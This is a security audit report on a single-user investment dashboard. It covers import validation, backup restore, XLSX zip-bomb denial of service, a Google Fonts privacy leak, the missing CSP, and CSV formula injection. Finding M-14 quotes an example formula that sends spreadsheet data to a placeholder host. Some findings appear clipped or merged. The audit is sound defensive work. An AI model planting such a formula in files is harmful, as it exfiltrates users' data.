Executive summary

The codebase is in good shape for a personal, edge-only dashboard: TypeScript strict everywhere, manual-entry form validators are tight, IndexedDB versioned, and React JSX text-escaping closes the obvious XSS class. No actively exploitable vulnerability was found. The interesting findings cluster around three themes:

  • The import path trusts XLSX cells that the manual form would reject. A negative quantity or zero-coerced unparseable cell becomes a row in IndexedDB without comment. The same XLSX is also an unbounded decompression source — no file-size or row-count cap.
  • Backup-restore silently drops manual holdings. VALID_SOURCES in restoreBackup.ts only accepts vested|groww; manual rows survive export but are rejected on restore, and the failure aborts the whole atomic replace. The schema-version check is also strict-equal, so a single DB_VERSION bump invalidates every prior backup.
  • Privacy claim vs. behaviour drift. CLAUDE.md states “no portfolio data leaves the device by default,” but index.html preconnects to fonts.googleapis.com and fonts.gstatic.com on every load — not portfolio data, but IP + UA exfil to Google with no opt-in.

Reliability gaps are concentrated in error containment: a single bad row can white-screen HoldingsRoute or AnalyticsRoute because only the chart subtree is wrapped in an error boundary, and IDB transaction failures (QuotaExceededError, version conflict) are not surfaced to the user.

What is solid

  • No dangerouslySetInnerHTML, eval, dynamic Function(), or string-form setTimeout anywhere in src/.
  • No href={userInput}, no target="_blank" on user-derived URLs, no Recharts custom HTML renderer — the XSS sink surface is effectively zero today.
  • Manual-entry validator (src/lib/holdingValidators.ts:56-64) correctly rejects quantity ≤ 0 and avgBuyPrice ≤ 0 — the bug is that the import path doesn’t reuse this contract.
  • IndexedDB uses idb with versioned upgrade callbacks (v1 → v2 → v3) and an indexed source+symbol primary key.
  • TypeScript strict mode, noUnusedLocals, noUncheckedSideEffectImports are all on across tsconfig.app.json, tsconfig.test.json, tsconfig.node.json.
  • .env is intentionally committed and contains only VITE_APP_TITLE — no leaked secrets.
  • Vite base: '/investment-dashboard/' is correctly set for the GH Pages subpath.
  • CI workflow uses least-needed permissions (contents: read, pages: write, id-token: write) and npm ci against a checked-in lockfile.

Threat model recap

The app is a static SPA on GitHub Pages with no server, no auth, and no first-party telemetry. Three attacker profiles are in scope:

A. Malicious import file

The user is tricked into importing an XLSX/CSV they believe is a Groww or Vested export. The attacker controls every cell. The win conditions are (i) JS execution ⇒ IndexedDB exfil, (ii) DoS via decompression / row-count, (iii) silent corruption of stored quantities or prices.

B. Malicious backup JSON

A user is offered a “sample portfolio” backup. The restore path replaces all holdings atomically. Win conditions are the same as A, minus DoS (JSON is parsed by the browser), plus “downgrade attacks” where an attacker-supplied schemaVersion bypasses newer validation.

C. Supply-chain drift

fonts.googleapis.com, npm packages (exceljs, recharts, idb, react-router-dom), and GitHub Actions are external dependencies. A takeover of any of these executes in the user’s browser with full access to the IndexedDB.

Out of scope

Network-level adversaries (GitHub Pages forces HTTPS), authentication (none), server compromise (none), other users (single-user app). MITM is residual only on third-party HTTPS dependencies.

High severity

H-1

Negative / non-finite quantities accepted on import (manual form rejects them)

High
Data integrity Threat model A
Files
src/parsers/groww.ts:71-78, src/parsers/vested.ts:72-79, src/parsers/xlsx-utils.ts:13-23, src/lib/restoreBackup.ts:105-135
Description

The manual entry form rejects quantity ≤ 0 and avgBuyPrice ≤ 0:

// src/lib/holdingValidators.ts:56-64
const quantity = parseFinite(input.quantity)
if (quantity === undefined || quantity <= 0) {
  errors.quantity = 'Quantity must be a positive number'
}
const avgBuyPrice = parseFinite(input.avgBuyPrice)
if (avgBuyPrice === undefined || avgBuyPrice <= 0) {
  errors.avgBuyPrice = 'Avg buy price must be a positive number'
}

But the broker import path only checks quantity === 0 for the “ghost row” filter:

// src/parsers/groww.ts:78
const ghost = !name || name === 'NA' || quantity === 0

And cellNumber() returns 0 for anything unparseable, so a cell containing "-10", "Infinity", or "1e308" passes straight through. Backup restore (restoreBackup.ts) only checks isFiniteNumber — negatives pass too.

Impact
An attacker-crafted XLSX with quantity: -100 stores a phantom short position. Cost-basis math (marketValueBase, concentration, topMovers) silently produces nonsense; HHI can go negative. A user who imports a tampered file then opens Analytics sees plausible-looking but inverted numbers, never told anything is wrong.
Fix
Promote holdingValidators.ts into a shared assertHolding() and call it (a) at the end of every parser, (b) inside validateHolding() in restoreBackup.ts. Reject — do not silently skip — rows that fail. Surface skipped rows in the import preview by symbol so the user can see what was dropped.
H-2

Backup restore silently drops all manual holdings — whole restore aborts

High
Data integrity Threat model B Confirmed by reading file
Files
src/lib/restoreBackup.ts:19, src/lib/restoreBackup.ts:99-101, src/storage/holdings.ts:4
Description
// src/lib/restoreBackup.ts:19
const VALID_SOURCES: ReadonlySet<Source> = new Set<Source>(['vested', 'groww'])
// :99
if (typeof raw.source !== 'string' || !VALID_SOURCES.has(raw.source as Source)) {
  return { ok: false, error: `source must be one of vested|groww` }
}

Source is defined as 'vested' | 'groww' | 'manual' in holdings.ts:4. exportSnapshot() exports every holding regardless of source. A backup round-trip of a portfolio that contains any manually-added position aborts the entire restoreAllHoldings() transaction with a per-row validation error.

Impact
The user’s only documented disaster-recovery path silently fails for any portfolio with a manual row — which is the dominant use case once Phase 1 lets users add holdings by hand. The transaction is atomic-replace, so the old data is untouched, but the user sees a generic failure and may try to “fix it” by re-importing, compounding the confusion.
Fix
Add 'manual' to VALID_SOURCES. Add a regression test that exports a portfolio with one row of each source and restores cleanly. Optionally split “skip invalid row” from “reject backup” so a single bad row doesn’t torch the entire restore.
H-3

XLSX zip-bomb / unbounded row iteration — main-thread DoS

High
Reliability Threat model A
Files
src/routes/import/UploadStep.tsx:30, src/parsers/groww.ts:67-99, src/parsers/vested.ts:68-100
Description

The upload handler reads the entire file into memory and hands the buffer to ExcelJS.load() with no size cap:

// src/routes/import/UploadStep.tsx (approx)
const buf = await file.arrayBuffer()
const result = await parseGroww(buf)

XLSX is a zip archive; a tiny compressed payload can expand to many GB. Both parsers then loop for (let i = headerRowIndex + 1; i <= ws.rowCount; i++) with no upper bound — ws.rowCount can be made arbitrarily large.

Impact
A 5 MB malicious .xlsx hangs the browser tab or kills it via OOM. Pre-commit, this is recoverable; mid-commit, it can leave a partially-written transaction in IDB (though idb aborts atomically on tab kill, so practical damage is limited to lost work and a soured user experience).
Fix
Reject file.size > 10 * 1024 * 1024 before arrayBuffer(). Cap the iteration with const max = Math.min(ws.rowCount, 50_000) and tell the user the file was truncated. If feasible, move parsing to a Web Worker so a hang doesn’t freeze the UI.
H-4

IndexedDB write failures are not surfaced to the UI

High
Reliability
Files
src/storage/holdings.ts — commitImport, upsertHolding, deleteHolding, setHoldingStatus, revertHoldingOverrides, restoreAllHoldings (all sites with await tx.done)
Description
Every write path awaits tx.done but has no try / catch and no error reporting back to the route. The IDB transaction will reject (and roll back atomically) on QuotaExceededError, version mismatch, or browser-imposed termination, but the calling component generally cannot distinguish “saved” from “silently rolled back.”
Impact
The Holdings UI shows success state after a deletion that actually rolled back. The Restore UI in DataBackupSection.tsx triggers location.reload() immediately after restoreAllHoldings, masking failure: the user reloads into the old portfolio convinced they restored.
Fix
Return a Result-shaped value from each write path and surface QuotaExceededError distinctly (offer to export current data first). Replace blind location.reload() in DataBackupSection with an in-route render of the restored state.
H-5

Google Fonts preconnect contradicts the “privacy first” claim

High
Privacy Threat model C
Files
index.html:9-14
Description
<link rel="preconnect" href="https://fonts.googleapis.com" />
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
<link href="https://fonts.googleapis.com/css2?family=Fraunces..." rel="stylesheet" />

Every page load opens a TLS connection to two Google domains and fetches a CSS+font from a third-party server. Portfolio data is not transmitted, but IP, User-Agent, Referer, and exact load timing are — on a dashboard explicitly framed as “all data stays on the user’s device.” CLAUDE.md: “No portfolio data leaves the device by default... no first-party telemetry under any condition.” The intent is clear; the implementation isn’t aligned.

Impact
Documented privacy promise is not currently met. Also a supply-chain dependency: a compromise of fonts.googleapis.com (or a hostile CSS feature like a CSS keylogger via @font-face tricks) injects styles into the page with the same origin as the rest of the app.
Fix
Self-host the two font families (download .woff2, generate @font-face in src/index.css). Delete both preconnect lines and the Google stylesheet <link>. Add an entry to a future SECURITY.md / privacy page asserting zero third-party network traffic.

Medium severity

M-1

No Content-Security-Policy meta tag — no defense-in-depth against future XSS

Medium
Security
Files
index.html
Description
GitHub Pages can’t set response headers, but a <meta http-equiv="Content-Security-Policy"> covers most of what matters (scripts, fetch, frame-ancestors). Today there’s nothing — if an XSS regression slips in (e.g. someone adds a Recharts custom HTML label, or imports a tooltip library that uses innerHTML), the IndexedDB is fully readable from the injected script.
Fix
Add (paired with self-hosted fonts from H-5): 
<meta http-equiv="Content-Security-Policy" content="
  default-src 'self';
  script-src 'self';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data:;
  font-src 'self';
  connect-src 'self' https://api.frankfurter.dev;
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'none';
" />
Tailwind v4 injects styles via JS so style-src 'unsafe-inline' is likely needed unless the build is reconfigured.

M-6

Backup parser accepts implausible FX rates and missing-range validation

Medium
Data integrity
Files
src/lib/restoreBackup.ts:124-135, src/lib/fx.ts:71-74
Description
fx.ts bounds FX between 1 and 1000 — already loose for USDINR (realistic ~70–100). restoreBackup.ts only checks isFiniteNumber, so a tampered backup with fxRate: 9999 rescales the whole INR view of a USD portfolio by 100×.

M-7

No top-level / route-level error boundary — one render throw white-screens the page

Medium
Reliability
Files
src/App.tsx, src/routes/AppShell.tsx, src/routes/HoldingsRoute.tsx:258-264, src/routes/AnalyticsRoute.tsx:60-92
Description
Only the chart subtree is wrapped in ChartErrorBoundary. M-8

Multi-tab import race — stale diff overwrites concurrent writes

Medium
Data integrity
Files
src/routes/import/UploadStep.tsx:29-34, src/routes/import/PreviewStep.tsx:27-65, src/storage/holdings.ts (commitImport)
Description
The diff is computed at upload time against a snapshot of getForSource() and then committed minutes later from PreviewStep. Between the two, a second tab can have run its own import. The first tab’s commitImport applies its diff against the new state, silently overwriting whatever the second tab added.
Fix
Re-read state inside the IDB transaction during commitImport, recompute the diff atomically, and refuse the commit if the snapshot has changed (surfacing “another tab modified holdings; please re-review”). Optionally use BroadcastChannel to invalidate stale wizard state.
M-9

Medium

Description
cellNumber() swallows every unparseable input and returns 0. The ghost-row filter then drops rows where quantity === 0, so a typo-d quantity ("thousand") becomes “row missing” with no error to the user. M-11

FX fetch has no retry / backoff / cached fallback signalling

Medium
Reliability
Files
src/lib/fx.ts, src/lib/refreshFx.ts
Description
fetchUsdInrRate() uses a 3-second timeout, no retries, and no jitter. PreviewStep.tsx falls back to settings.lastFxRate without telling the user it’s using a stale value. For a portfolio with mostly USD holdings this drifts cost basis materially.

M-14

CSV/formula-injection: leading =+@- not stripped from parsed cell text

Medium
Security
Files
src/parsers/xlsx-utils.ts:3-11 (cellString)
Description
The app doesn’t execute formulas, but if “export holdings as CSV” ships later (a likely Phase 1 ask), an attacker who slipped =HYPERLINK("http://x/?p="&A2,"click") into an imported broker file would have it appear verbatim in the user’s exported CSV. Excel/Sheets executes formulas on open.
Fix
At parse time, prefix any cell starting with =, +, -, @, TAB, or CR with a single quote (the OWASP-recommended mitigation) before storing. Alternatively, do it only at CSV-export time. Doing it at parse is simpler and survives future export paths.

Mapping to Juspay’s 10X reliability tenets

The four tenets that actually apply to a single-user static SPA:

  • Tenet 2 (critical-path simplicity): The import wizard is the critical path. H-3, M-8, M-9 add edge cases on this path.
  • Tenet 3 (blast-radius limits): M-7 (no top-level error boundary) and H-4 (silent IDB failure) directly contradict this tenet — a single bad row should not brick the page, and a failed write should not look like success.
  • Tenet 4 (anomaly detection / RCA): M-9, M-11 — the app silently rounds, defaults, and falls back. Surface every fallback to the user.
  • Tenet 6 (staggered rollouts): Not applicable — static site, one user. Skip.

Recommended remediation order

  1. Quick wins (1 PR): H-5 (self-host fonts) + M-1 (add CSP meta) + L-1 (delete duplicate deploy.yml) + L-2 (pin Node) + L-3 (explicit sourcemap: false) + M-2 (pin GH Actions to SHAs).
  2. Trust untrusted input (1 PR): H-1 (share assertHolding) + H-3 (file-size + row caps) + M-9 (distinguish required vs. optional numeric cells) + M-14 (strip formula-injection prefixes).
  3. Backup correctness (1 PR): H-2 (allow manual) + M-4 (schema migration) + M-5 (include history) + M-6 (FX bounds) + L-7 (timestamp invariants).
  4. Error containment (1 PR): H-4 (Result-shaped IDB writes; remove location.reload()) + M-7 (route-level error boundaries) + M-8 (re-diff inside transaction) + M-13 (modal focus trap).
  5. Polish: M-10, M-11, M-12, L-5, L-6, L-8, L-9, I-1–I-3.

Audit conducted on a worktree of main @ 35334a8 by four parallel read-only review passes (storage, parsers, UI, build/deploy). High-severity claims spot-checked against the source. No code modified. Severities reflect this app’s threat model (edge-only, single user, no backend), not generic web-app defaults — that’s why “no CSP” is Medium and “negative-quantity import” is High.
